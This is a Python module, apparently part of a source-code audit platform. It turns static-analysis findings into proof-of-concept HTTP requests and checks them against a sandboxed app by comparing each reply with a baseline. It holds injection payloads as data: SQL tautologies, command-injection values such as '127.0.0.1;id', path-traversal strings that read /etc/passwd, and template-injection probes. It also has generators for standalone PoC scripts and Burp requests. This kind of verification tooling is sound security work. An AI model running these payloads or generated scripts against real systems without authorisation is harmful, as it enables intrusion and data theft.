"""POC 自动验证 skill：通过沙箱容器内 HTTP 请求验证漏洞（internal 网络，宿主不暴露端口）"""
import re
import time
from pathlib import Path


def _find_func_name(lines: list[str], line: int) -> str | None:
    """向前找包含该行（含之前）的最近函数定义名"""
    for i in range(max(line - 1, 0), -1, -1):
        m = re.search(r'function\s+(\w+)\s*\(', lines[i])
        if m:
            return m.group(1)
    return None


def extract_php_action(workspace: str, file_path: str, line: int) -> dict | None:
    """PHP action 分发解析：$_xxx['action'] + switch case → {'action': case, 'params': [键列表]}
    例：action=download & file 参数（perfect.php 的 $fm->download($_GET['file'])）"""
    try:
        lines = (Path(workspace) / file_path).read_text(errors="ignore").splitlines()
    except OSError:
        return None
    fn = _find_func_name(lines, line)
    if not fn:
        return None
    # action 变量名
    act_var = None
    for ln in lines:
        m = re.search(r'\$(\w+)\s*=\s*\$_?(?:GET|POST|REQUEST)\[\s*[\'"]action[\'"]\s*\]', ln)
        if m:
            act_var = m.group(1)
            break
    if not act_var:
        return None
    switch_idx = None
    for i, ln in enumerate(lines):
        if re.search(r'switch\s*\(\s*\$' + act_var + r'\s*\)', ln):
            switch_idx = i
            break
    if switch_idx is None:
        return None
    for j in range(switch_idx + 1, len(lines)):
        m = re.match(r'\s*case\s*[\'"]([\w\-]+)[\'"]\s*:', lines[j])
        if not m:
            continue
        case_val = m.group(1)
        body = []
        k = j + 1
        while k < len(lines) and k < len(lines) and not re.search(r'\s*case\s*[\'"]', lines[k]) and 'break' not in lines[k]:
            body.append(lines[k])
            k += 1
        body_text = "\n".join(body)
        if f'->{fn}(' in body_text or re.search(rf'(?<![>\w]){fn}\s*\(', body_text):
            keys = re.findall(r'\$_?(?:GET|POST|REQUEST)\[\s*[\'"]([\w\-]+)[\'"]\s*\]', body_text)
            # 参数来源决定 HTTP 方法：出现 $_POST 即 POST，仅 $_GET 为 GET，两者都有优先 POST
            method = "POST" if re.search(r'\$_POST\[', body_text) else "GET"
            return {"action": case_val, "params": keys, "method": method}
    return None


def extract_route(workspace: str, file_path: str, line: int) -> str | None:
    """从漏洞所在源文件中，向上查找最近的路由注解/注册，返回路径"""
    candidates = [
        re.compile(r'@app\.route\(\s*["\']([^"\']+)'),
        re.compile(r'@router\.(?:get|post|route)\(\s*["\']([^"\']+)'),
        re.compile(r'@(?:GetMapping|PostMapping|PutMapping|DeleteMapping|RequestMapping)\(\s*["\']?([^"\'),]+)'),
        # Express / Koa: app.get('/x'), router.post("/x")
        re.compile(r'(?:app|router)\.(?:get|post|put|delete|patch)\(\s*["\']([^"\']+)'),
        # Next.js / Nuxt 常见 API 文件路径（由调用方补）
    ]
    try:
        full = Path(workspace) / file_path
        lines = full.read_text(errors="ignore").splitlines()[: max(line, 1)]
    except OSError:
        return None
    for i in range(len(lines) - 1, -1, -1):
        for pat in candidates:
            m = pat.search(lines[i])
            if m:
                route = m.group(1).strip()
                if not route.startswith("/"):
                    route = "/" + route
                return route
    return None


def _parse_qs(s: str) -> dict:
    """解析 urlencoded 键值对 → dict"""
    out = {}
    for kv in (s or "").split("&"):
        if "=" in kv:
            k, _, v = kv.partition("=")
            out[k.strip()] = v
    return out


def parse_poc_request(payload: str) -> dict:
    """解析 POC payload 字符串为 {method, route, query_params, body_params}。
    兼容形态：
    - 'GET /perfect.php?action=download&file=/etc/passwd'
    - 'POST /perfect.php?action=update\\nid=1 OR 1=1&email=a@b.com'（新格式：query 放 action，body 放注入参数）
    - 旧格式 'POST /perfect.php?action=update  body: id=1 OR 1=1&email=a@b.com'
    - 无方法前缀/无路由形态按 POST body 处理"""
    payload = (payload or "").strip().strip("`")
    if " body:" in payload:
        head, _, body = payload.partition(" body:")
    else:
        head, _, body = payload.partition("\n")
    head, body = head.strip(), body.strip()
    mm = re.match(r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+(.+)$", head, re.IGNORECASE)
    if mm:
        method = mm.group(1).upper()
        rest = mm.group(2).strip()
        if rest.startswith("/"):
            route, _, qs = rest.partition("?")
            if not route.startswith("/"):
                route = "/" + route
            return {"method": method, "route": route,
                    "query_params": _parse_qs(qs), "body_params": _parse_qs(body)}
        # 如 "POST action=update&id=1 OR 1=1&email=a@b.com"：无路由，全部当 body
        return {"method": method, "route": "/",
                "query_params": {}, "body_params": _parse_qs(rest or body)}
    if "=" in head and ("&" in head or "action" in head):
        return {"method": "POST", "route": "/", "query_params": {}, "body_params": _parse_qs(head)}
    q = head[1:] if head.startswith("?") else head
    return {"method": "GET", "route": "/", "query_params": _parse_qs(q), "body_params": {}}


def normalize_payload(payload: str) -> str:
    """将任意形态（含 Agent 自由提交、旧 body: 前缀）的 payload 规范化为干净文本：
    - POST: POST /route?action=xxx\n注入参数=k
    - GET:  GET /route?k=v
    供落库与展示统一使用，避免出现 'body: 这个是啥' 的困惑。"""
    req = parse_poc_request(payload)
    method = req["method"]
    route = req["route"] or "/"
    q = "&".join(f"{k}={v}" for k, v in req["query_params"].items())
    b = "&".join(f"{k}={v}" for k, v in req["body_params"].items())
    url = f"{route}?{q}" if q else route
    if method == "POST":
        return f"POST {url}" + (f"\n{b}" if b else "")
    return f"GET {url}" + (f"\n{b}" if b else "")


def generate_python_poc(payload: str, label: str = "漏洞") -> str:
    """根据已验证的 payload 生成独立可运行的 Python POC 脚本（requests，面向真实部署）"""
    import urllib.parse
    req = parse_poc_request(payload)
    method = req["method"]
    route = req["route"]
    # GET 的查询串必须 URL 编码：payload 含空格/引号/中文时裸拼会生成无效 URL
    q = urllib.parse.urlencode(req["query_params"])
    url_full = (route + "?" + q) if q else route
    params = req["body_params"]
    is_post = method == "POST"
    call = f"    r = requests.{'post' if is_post else 'get'}(URL, {'data' if is_post else 'params'}=PARAMS, timeout=15)"
    return f"""#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 漏洞 POC（源码审计平台自动生成）: {label}
# 用法: python3 poc.py [目标URL]   默认 http://127.0.0.1:8000
import sys

import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8000'
URL = TARGET + {url_full!r}
PARAMS = {params!r}


def main():
{call}
    print('HTTP', r.status_code)
    print('-' * 60)
    print(r.text[:3000])
    if r.status_code == 200:
        print('[-] 漏洞触发失败或未命中（200 不代表无漏洞，请结合回显判断）')
    else:
        print('[+] 目标返回异常状态码，漏洞可能已触发（请结合回显判断）')


if __name__ == '__main__':
    main()
"""


def extract_flask_endpoint(workspace: str, file_path: str, line: int) -> dict | None:
    """Flask 路由 + 表单参数：@app.route("/lab1", methods=["GET","POST"])
    + request.form.get("domain") -> {route, method, param}"""
    try:
        lines = (Path(workspace) / file_path).read_text(errors="ignore").splitlines()
    except OSError:
        return None
    route = None
    methods = []
    deco_idx = None
    route_re = re.compile(
        r'@app\.route\(\s*["\']([^"\']+)["\'](?:[^)]*methods\s*=\s*\[([^\]]+)\])?')
    for i in range(min(max(line, 1), len(lines)) - 1, -1, -1):
        m = route_re.search(lines[i])
        if m:
            route, methods, deco_idx = m.group(1), (m.group(2) or "").upper(), i
            break
    if not route or deco_idx is None:
        return None
    param = None
    used_form = False
    for i in range(deco_idx + 1, min(len(lines), deco_idx + 250)):
        if i > deco_idx + 1 and re.match(r"\s*@|def\s+", lines[i]):
            break
        for m in re.finditer(
                r'request\.(form|args)(?:\.get\(\s*["\']([^"\']+)["\']|\[\s*["\']([^"\']+)["\']\s*\])',
                lines[i]):
            param = m.group(2) or m.group(3)
            used_form = m.group(1) == "form"
            break
        if param:
            break
    if not param:
        return None
    method = "POST" if used_form or "POST" in methods else "GET"
    return {"route": route, "method": method, "param": param}


def _php_payload(php: dict | None, rule: str) -> dict | None:
    """PHP action 分发下的 payload；键优先匹配语义（file/url/id 等）"""
    if not php:
        return None
    keys = php["params"]
    if not keys:
        return None

    def key_for(prefs: list[str], default=None) -> str | None:
        for k in keys:
            for p in prefs:
                if p in k:
                    return k
        return default

    base = {"route": "/", "method": php.get("method", "GET"), "params": dict(action=php["action"])}
    if "sql" in rule or "query" in rule:
        idk = key_for(("id", "user", "uid"))
        emk = key_for(("email",))
        if idk:
            base["params"][idk] = "1 OR 1=1"
        if emk:
            base["params"][emk] = "a@b.com"
        if not idk and not emk:
            base["params"][keys[0]] = "1 OR 1=1"
        base["expect"] = ["sql", "syntax", "error", "mysql", "warning", "pdo", "exception", "query"]
        return base
    if "ssrf" in rule or "remote" in rule:
        uk = key_for(("url", "uri", "link"))
        base["params"][uk if uk else keys[0]] = "http://127.0.0.1:80/"
        base["expect"] = []
        return base
    if "delete" in rule or "unlink" in rule or "rmdir" in rule:
        fk = key_for(("file", "name", "path", "filename"))
        base["params"][fk if fk else keys[0]] = "....//....//etc/passwd"
        base["expect"] = ["file deleted"]
        return base
    if "read" in rule or "file" in rule or "inclusion" in rule or "include" in rule or "contents" in rule:
        fk = key_for(("file", "name", "path", "filename"))
        base["params"][fk if fk else keys[0]] = "/etc/passwd"
        base["expect"] = ["root:", "/bin/"]
        return base
    if "command" in rule or "cmd" in rule or "shell" in rule or "exec" in rule:
        hk = key_for(("host", "ip", "url"))
        base["params"][hk if hk else keys[0]] = "127.0.0.1;id"
        base["expect"] = ["uid="]
        return base
    return None


def build_poc(vuln: dict, workspace: str = "") -> dict | None:
    """根据规则类型构造 POC：返回 {route, params, expect} 或 None"""
    rule = vuln["rule_id"].lower()
    fp = vuln.get("file_path", "")
    line = vuln.get("line", 0)
    route = extract_route(workspace, fp, line) or "/"

    # PHP：尝试 action 分发（优先于通用路由）
    if str(fp).lower().endswith(".php"):
        php = extract_php_action(workspace, fp, line)
        php_poc = _php_payload(php, rule)
        if php_poc:
            return php_poc

    # Flask/FastAPI 表单/查询参数：让 /lab1 这类 POST 表单也能自动 POC
    if str(fp).lower().endswith(".py"):
        ep = extract_flask_endpoint(workspace, fp, line)
        if ep:
            key = ep["param"]
            base = {"route": ep["route"], "method": ep["method"], "params": {key: ""}}
            if "sql-injection" in rule:
                base["params"][key] = "1 OR 1=1"
                base["expect"] = ["sql", "syntax", "error", "mysql", "warning", "pdo", "exception"]
                return base
            if ("command-injection" in rule or "command-line-injection" in rule
                    or "tainted-exec" in rule):
                base["params"][key] = "127.0.0.1;sleep 3"
                base["expect"] = ["uid=", "gid="]
                return base
            if ("eval-exec" in rule or "code-injection" in rule
                    or "code-execution" in rule):
                base["params"][key] = "1+1"
                base["expect"] = ["2"]
                return base
            if "template" in rule or "ssti" in rule or "render-template" in rule:
                base["params"][key] = "{{7*7}}"
                base["expect"] = ["49"]
                return base
            if "xss" in rule or "echoed-request" in rule:
                base["params"][key] = "<b>POC_XSS</b>"
                base["expect"] = ["<b>poc_xss</b>"]
                return base

    if "sql-injection" in rule:
        return {"route": route, "params": {"id": "1 OR 1=1"},
                "expect": ["sql", "syntax", "error", "sqlite", "mysql", "union", "warning"]}
    if ("command-injection" in rule or "command-line-injection" in rule
            or "tainted-exec" in rule):
        return {"route": route, "params": {"host": "127.0.0.1;id"},
                "expect": ["uid=", "gid="]}
    if "eval-exec" in rule or "code-injection" in rule or "code-execution" in rule:
        return {"route": route, "params": {"expr": "1+1"}, "expect": ["2"]}
    if "template" in rule or "ssti" in rule or "render-template" in rule:
        return {"route": route, "params": {"name": "{{7*7}}"}, "expect": ["49"]}
    if "tainted-callable" in rule or "call_user_func" in rule:
        return {"route": route, "params": {"fn": "system", "arg": "id"}, "expect": ["uid=", "gid="]}
    if "path-traversal" in rule or "file-inclusion" in rule:
        return {"route": route,
                "params_list": [
                    {"name": "../../../../etc/passwd"},
                    {"name": "....//....//etc/passwd"},
                    {"name": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
                ],
                "params": {"name": "../../../../etc/passwd"},
                "expect": ["root:", "/bin/"]}
    if "ssrf" in rule:
        return {"route": route, "params": {"url": "http://127.0.0.1:80"}, "expect": []}
    if "xss" in rule or "echoed-request" in rule:
        return {"route": route, "params": {"name": "<b>POC_XSS</b>"},
                "expect": ["<b>poc_xss</b>"]}
    if "deserialization" in rule or "pickle" in rule:
        return {"route": route, "params": {"data": "gASV"}, "expect": []}
    return None


def poc_payload_str(poc: dict) -> str:
    """将 POC 结构化为清晰文本（无 'body:' 前缀）：
    - GET:  GET /route?k=v&k2=v2
    - POST: POST /route?action=xxx\\n注入参数=payload（action 放 query，其余放 body，更贴近真实请求包）"""
    params = dict(poc.get("params") or {})
    method = poc.get("method", "GET").upper()
    route = poc.get("route", "/") or "/"
    if method == "POST":
        action = params.pop("action", None)
        body = "&".join(f"{k}={v}" for k, v in params.items())
        url = f"{route}?action={action}" if action and "?" not in route else route
        return f"POST {url}" + (f"\n{body}" if body else "")
    qs = "&".join(f"{k}={v}" for k, v in params.items())
    sep = "&" if "?" in route else "?"
    return f"GET {route}{sep}{qs}" if qs else f"GET {route}"


def verify(vuln: dict, workspace: str, handle) -> tuple[bool, str]:
    """执行单个 POC（handle.request 为容器内 HTTP 请求），返回 (poc_verified, verify_result)"""
    poc = build_poc(vuln, workspace)
    if poc is None or handle is None or not getattr(handle, "internal_port", None):
        return False, "该规则类型暂不支持自动 POC 或沙箱未就绪"
    rule = vuln["rule_id"].lower()

    # 命令注入：时序盲注检测（sleep 3 与基线请求对比）
    if ("command-injection" in rule or "command-line-injection" in rule
            or "tainted-exec" in rule):
        try:
            params = poc.get("params") or {}
            key = "host" if "host" in params else next(
                (k for k in params if k not in ("action", "os")), "host")
            method = poc.get("method", "GET")
            t0 = time.time()
            handle.request(poc["route"], {key: "127.0.0.1"}, method=method)
            base_t = time.time() - t0
            t1 = time.time()
            handle.request(poc["route"], {key: "127.0.0.1;sleep 3"}, method=method)
            delay_t = time.time() - t1
            if delay_t - base_t >= 2.5:
                return True, f"时序盲注成立：注入请求耗时 {delay_t:.1f}s（基线 {base_t:.1f}s）"
            return False, f"时序差异不足：注入 {delay_t:.1f}s vs 基线 {base_t:.1f}s"
        except Exception as e:
            return False, f"请求失败: {type(e).__name__}"

    # 通用：单 payload 或多 payload 逐一尝试。
    # 先打一次**不带 payload 的基线**再差分比对：2026-11-01 查出 4 行假阳
    # （InvoicePlane #81123、livehelperchat #116956/#116957、vvveb #32616），
    # 特征都是 expect=["2"] + "HTTP 404，响应命中特征: ['2']" —— 单个数字在任何
    # HTML（版本号、年份、class 名）里都会命中，而 404 根本不是执行成功的证据。
    method = poc.get("method", "GET")
    params_list = poc.get("params_list") or [poc["params"]]
    try:
        base_status, base_body = handle.request(poc["route"], {}, method=method)
    except Exception as e:
        return False, f"基线请求失败: {type(e).__name__}"
    try:
        bcode = int(base_status)
    except (TypeError, ValueError):
        bcode = 0
    if not 100 <= bcode < 600:
        return False, (f"基线请求（不带 payload）都没拿到 HTTP 响应（status={base_status}），"
                       f"应用未启动或路由不可达，不算复现")

    try:
        for params in params_list:
            status, body = handle.request(poc["route"], params, method=method)
            ok, why = _judge(status, body, bcode, base_body, poc["expect"])
            if ok:
                return True, why
        return False, (f"payload 与基线（HTTP {bcode}）无实质差异，"
                       f"基线本身已含特征 {_hits(poc['expect'], base_body)}，不算复现")
    except Exception as e:
        return False, f"请求失败: {type(e).__name__}"


def _hits(expect, body):
    """返回 body 里出现的特征词（大小写不敏感）。"""
    low = (body or "").lower()
    return [k for k in (expect or []) if str(k).lower() in low]


def _judge(status, body, base_code, base_body, expect):
    """纯函数：payload 响应 vs 基线响应，要不要算复现。可单测，不起沙箱。

    三条硬规则：
      1. 必须真的拿到 HTTP 响应（HTTP 0 / 连不上不算）；
      2. 只有 2xx/3xx 才算正例 —— 404/403 的错误页里含不含数字都毫无意义；
      3. 特征必须是**基线没有、payload 才有**的差分，否则任何页面都能命中弱特征。
    5xx 只有相对基线是新增时才给"疑似"，并在文案里说明它不等于回显证据。
    """
    try:
        code = int(status)
    except (TypeError, ValueError):
        code = 0
    if not 100 <= code < 600:
        return False, (f"沙箱未返回任何 HTTP 响应（status={status}），"
                       f"应用未启动或路由不可达，不算复现")
    ph = _hits(expect, body)
    bh = _hits(expect, base_body)
    delta = [k for k in ph if k not in bh]
    if 200 <= code < 400 and delta:
        return True, (f"HTTP {code}（基线 HTTP {base_code}），相对基线新增特征 {delta}"
                      + (f"；基线已含 {bh} 已排除" if bh else ""))
    if code >= 500 and base_code < 500:
        return True, (f"HTTP {code} 触发服务端异常，基线是 HTTP {base_code}，行为差异成立；"
                      f"但这只是『疑似』，没有回显证据不升级为已复现")
    return False, (f"HTTP {code} 相对基线 HTTP {base_code} 无有效新增特征"
                   f"（payload 命中 {ph}，基线命中 {bh}）")


def _poc_priority(item, workspace: str):
    """POC 候选排序：可映射规则 > 能提取 route > 严重性 > CodeQL 来源"""
    row, v = item
    rule = str(v.get("rule_id", "")).lower()
    supported = any(k in rule for k in (
        "sql-injection", "command-injection", "command-line-injection", "tainted-exec", "path-traversal",
        "file-inclusion", "ssrf", "xss", "echoed-request", "deserialization",
        "pickle", "template", "ssti", "render-template", "eval-exec",
        "code-injection", "code-execution", "tainted-callable", "call_user_func",
    ))
    route = extract_route(workspace, v.get("file_path", ""), v.get("line", 0)) if workspace else None
    sev = {"ERROR": 0, "HIGH": 0, "WARNING": 1, "MEDIUM": 1, "INFO": 2, "LOW": 2}.get(
        str(v.get("severity", "")).upper(), 3)
    source = 0 if v.get("source") == "codeql" else 1
    return (0 if supported else 1, 0 if route and route != "/" else 1, sev, source)


def verify_all(vuln_rows: list[tuple], workspace: str, handle, max_n: int = 8) -> int:
    """批量验证，按可验证性排序后就地写入 row.poc_* 字段，返回验证通过条数"""
    passed = 0
    ordered = sorted(vuln_rows, key=lambda item: _poc_priority(item, workspace))[:max_n]
    for row, v in ordered:
        try:
            ok, result = verify(v, workspace, handle)
            poc = build_poc(v, workspace)
            row.poc_payload = poc_payload_str(poc) if poc else None
            row.poc_verified = ok
            row.verify_result = result
            if ok:
                passed += 1
        except Exception as e:
            row.poc_verified = False
            row.verify_result = f"POC 执行异常: {e}"[:300]
    return passed


def generate_burp_request(payload: str, host: str = "<TARGET>",
                          cookie: str = "", headers: list[str] | None = None) -> str:
    """把平台 payload 渲染成 Burp Repeater 可直接粘贴的原始 HTTP 请求。
    支持：GET /path?x=1、POST /path body: {...}、POST /path\\n{...}、
    POST /path\\nid=1&email=x、POST /path (登录态 Cookie) | {...}。"""
    text = (payload or "").strip().strip("`")
    if " body:" in text:
        head, _, body = text.partition(" body:")
    else:
        head, _, body = text.partition("\n")
    head, body = head.strip(), body.strip()
    note = ""
    m = re.match(r"^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+(\S+)\s*(.*)$", head, re.I)
    if m:
        method, path, tail = m.group(1).upper(), m.group(2), m.group(3).strip()
        if tail.startswith(("{", "[")):
            body = tail if not body else tail + "\n" + body
        elif "|" in tail:
            note, _, tail_body = tail.partition("|")
            note, tail_body = note.strip(), tail_body.strip()
            body = tail_body if tail_body else body
        elif tail:
            note = tail
            if "=" in tail:
                body = tail if not body else tail + "\n" + body
    elif head.startswith(("{", "[")) or body.startswith(("{", "[")):
        method, path = "POST", "/"
        body = (head + ("\n" + body if body else "")).strip()
    elif "=" in head:
        method, path, body = "POST", "/", (head + ("\n" + body if body else "")).strip()
    else:
        method, path, body = "GET", ("/" + head.lstrip("/") if head else "/"), body
    if not cookie and re.search(r"cookie|登录|已鉴权|鉴权", note, re.I):
        cookie = "sessionid=<登录态 Cookie>"
    lines = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: Mozilla/5.0",
        "Accept: */*",
        "Connection: close",
    ]
    if cookie:
        lines.append(f"Cookie: {cookie}")
    for h in (headers or []):
        if ":" in h:
            lines.append(h.strip())
    if body:
        ctype = ("application/json" if body.startswith(("{", "["))
                 else "application/x-www-form-urlencoded")
        lines += [f"Content-Type: {ctype}",
                  f"Content-Length: {len(body.encode('utf-8'))}"]
    return "\n".join(lines) + "\n\n" + (body + "\n" if body else "")
